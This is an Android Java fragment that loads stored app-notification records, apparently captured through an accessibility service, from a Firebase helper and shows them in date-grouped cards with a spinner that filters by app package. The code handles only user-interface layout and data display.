package com.vikasyadavnsit.cdc.fragment;

import android.app.Activity;
import android.graphics.Typeface;
import android.os.Bundle;
import android.util.DisplayMetrics;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.GridLayout;
import android.widget.LinearLayout;
import android.widget.Spinner;
import android.widget.TextView;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;

import com.vikasyadavnsit.cdc.R;
import com.vikasyadavnsit.cdc.data.NotificationData;
import com.vikasyadavnsit.cdc.data.SpinnerItem;
import com.vikasyadavnsit.cdc.utils.FirebaseUtils;

import java.time.LocalDate;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.ArrayList;
import java.util.Comparator;
import java.util.HashMap;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.TreeMap;
import java.util.TreeSet;

public class AccessibilityNotificationFragment extends Fragment {

    private static final DateTimeFormatter FORMATTER =
            DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");

    private static GridLayout fragmentLayout;
    private static Spinner dropdownSpinner;
    private static ArrayAdapter<SpinnerItem> spinnerArrayAdapter;

    @Nullable
    @Override
    public View onCreateView(@NonNull LayoutInflater inflater,
                             @Nullable ViewGroup container,
                             @Nullable Bundle savedInstanceState) {
        View view = inflater.inflate(R.layout.fragment_accessibility_notification, container, false);
        fragmentLayout = view.findViewById(R.id.accessibility_notification_fragment_layout);
        dropdownSpinner = view.findViewById(R.id.accessibility_notification_fragment_dropdown_spinner);
        fragmentLayout.setColumnCount(calculateNoOfColumns());
        FirebaseUtils.getAndroidUserAccessibilityNotification();
        return view;
    }

    private int calculateNoOfColumns() {
        DisplayMetrics dm = getResources().getDisplayMetrics();
        float dpWidth = dm.widthPixels / dm.density;
        return Math.max(1, Math.min((int) (dpWidth / 300), 3));
    }

    public static void displayNotifications(Activity activity,
                                             TreeMap<String, NotificationData> notificationDataTreeMap) {
        TreeSet<String> uniquePackages = new TreeSet<>();
        for (NotificationData data : notificationDataTreeMap.values()) {
            if (data != null && data.getPackageName() != null) {
                uniquePackages.add(data.getPackageName());
            }
        }
        initializeSpinner(activity, uniquePackages);
        setupSpinnerListener(activity, notificationDataTreeMap);
    }

    private static void initializeSpinner(Activity activity, TreeSet<String> uniquePackages) {
        SpinnerItem[] items = new SpinnerItem[uniquePackages.size() + 2];
        items[0] = new SpinnerItem("Select an application", null);
        items[1] = new SpinnerItem("Show all apps data", null);
        int index = 2;
        for (String pkg : uniquePackages) items[index++] = new SpinnerItem(pkg, null);
        spinnerArrayAdapter = new ArrayAdapter<>(activity, android.R.layout.simple_spinner_item, items);
        spinnerArrayAdapter.setDropDownViewResource(android.R.layout.simple_spinner_dropdown_item);
        dropdownSpinner.setAdapter(spinnerArrayAdapter);
    }

    private static void setupSpinnerListener(Activity activity,
                                              TreeMap<String, NotificationData> notificationDataTreeMap) {
        dropdownSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> parent, View view, int position, long id) {
                fragmentLayout.removeAllViews();
                if (position == 0) {
                    // placeholder
                } else if (position == 1) {
                    displayAllAppsData(activity, notificationDataTreeMap);
                } else {
                    displaySelectedAppData(activity, notificationDataTreeMap,
                            (SpinnerItem) parent.getItemAtPosition(position));
                }
            }

            @Override
            public void onNothingSelected(AdapterView<?> parent) {
            }
        });
    }

    private static void displayAllAppsData(Activity activity,
                                            TreeMap<String, NotificationData> map) {
        Map<String, List<NotificationData>> grouped = groupByDate(map);
        for (Map.Entry<String, List<NotificationData>> entry : grouped.entrySet()) {
            LinearLayout group = createGroupLayout(activity, entry.getKey());
            for (NotificationData nd : entry.getValue()) addNotificationRow(group, nd);
            fragmentLayout.addView(group);
        }
    }

    private static void displaySelectedAppData(Activity activity,
                                                Map<String, NotificationData> map,
                                                SpinnerItem selectedItem) {
        String pkg = selectedItem.getLabel();
        Map<LocalDate, List<NotificationData>> grouped = new HashMap<>();
        map.values().stream()
                .filter(d -> d.getPackageName().equals(pkg))
                .forEach(d -> {
                    LocalDate date = LocalDateTime.parse(d.getTimestamp(), FORMATTER).toLocalDate();
                    grouped.computeIfAbsent(date, k -> new ArrayList<>()).add(d);
                });
        List<LocalDate> sortedDates = new ArrayList<>(grouped.keySet());
        sortedDates.sort((a, b) -> b.compareTo(a));
        for (LocalDate date : sortedDates) {
            LinearLayout group = createGroupLayout(activity, date.toString());
            for (NotificationData nd : grouped.get(date)) addNotificationRow(group, nd);
            fragmentLayout.addView(group);
        }
    }

    private static Map<String, List<NotificationData>> groupByDate(
            TreeMap<String, NotificationData> map) {
        Map<LocalDate, List<NotificationData>> grouped = new HashMap<>();
        map.values().forEach(nd -> {
            LocalDate date = LocalDateTime.parse(nd.getTimestamp(), FORMATTER).toLocalDate();
            grouped.computeIfAbsent(date, k -> new ArrayList<>()).add(nd);
        });
        List<LocalDate> keys = new ArrayList<>(grouped.keySet());
        keys.sort(Comparator.reverseOrder());
        Map<String, List<NotificationData>> sorted = new LinkedHashMap<>();
        for (LocalDate k : keys) sorted.put(k.toString(), grouped.get(k));
        return sorted;
    }

    private static LinearLayout createGroupLayout(Activity activity, String dateText) {
        float density = activity.getResources().getDisplayMetrics().density;
        LinearLayout group = new LinearLayout(activity);
        group.setOrientation(LinearLayout.VERTICAL);
        group.setBackgroundResource(R.drawable.group_border);
        int pad = dp(16, density);
        group.setPadding(pad, pad, pad, pad);

        GridLayout.LayoutParams p = new GridLayout.LayoutParams();
        p.width = 0;
        p.height = GridLayout.LayoutParams.WRAP_CONTENT;
        p.columnSpec = GridLayout.spec(GridLayout.UNDEFINED, 1f);
        p.setMargins(dp(8, density), dp(8, density), dp(8, density), dp(8, density));
        group.setLayoutParams(p);

        TextView header = new TextView(activity);
        header.setText(dateText);
        header.setTextColor(activity.getColor(R.color.text_primary));
        header.setTextSize(14f);
        header.setTypeface(null, Typeface.BOLD);
        LinearLayout.LayoutParams hp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        hp.setMargins(0, 0, 0, dp(8, density));
        header.setLayoutParams(hp);
        group.addView(header);

        View divider = new View(activity);
        divider.setBackgroundColor(activity.getColor(R.color.divider));
        LinearLayout.LayoutParams dp2 = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1);
        dp2.setMargins(0, 0, 0, dp(8, density));
        divider.setLayoutParams(dp2);
        group.addView(divider);

        return group;
    }

    private static void addNotificationRow(LinearLayout group, NotificationData nd) {
        Activity activity = (Activity) group.getContext();
        float density = activity.getResources().getDisplayMetrics().density;

        String time = LocalDateTime.parse(nd.getTimestamp(), FORMATTER)
                .format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        StringBuilder sb = new StringBuilder(time).append("\n");
        if (nd.getExtras() != null) {
            nd.getExtras().forEach((k, v) -> sb.append(k).append(": ").append(v).append("\n"));
        }

        TextView tv = new TextView(activity);
        tv.setText(sb.toString().trim());
        tv.setTextColor(activity.getColor(R.color.text_secondary));
        tv.setTextSize(12f);
        tv.setLineSpacing(0, 1.3f);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, dp(6, density), 0, dp(2, density));
        tv.setLayoutParams(lp);
        group.addView(tv);

        View sep = new View(activity);
        sep.setBackgroundColor(activity.getColor(R.color.divider));
        sep.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, 1));
        group.addView(sep);
    }

    private static int dp(int v, float density) {
        return (int) (v * density);
    }
}
